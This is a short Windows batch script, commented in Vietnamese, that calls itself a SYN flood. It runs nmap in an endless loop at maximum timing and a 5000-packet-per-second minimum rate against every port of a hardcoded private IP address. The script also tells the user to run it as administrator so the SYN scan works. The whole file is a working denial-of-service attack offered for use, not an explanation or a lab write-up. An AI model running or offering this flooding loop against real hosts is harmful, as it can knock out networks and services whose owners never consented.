@echo off
chcp 65001 >nul
set TARGET=192.168.137.1
echo SYN flood bang nmap -> %TARGET%  (Ctrl+C de dung)
echo (Nen chay "Run as administrator" de dung -sS)
:loop
nmap -sS -T5 --min-rate 5000 -p- %TARGET%
goto loop
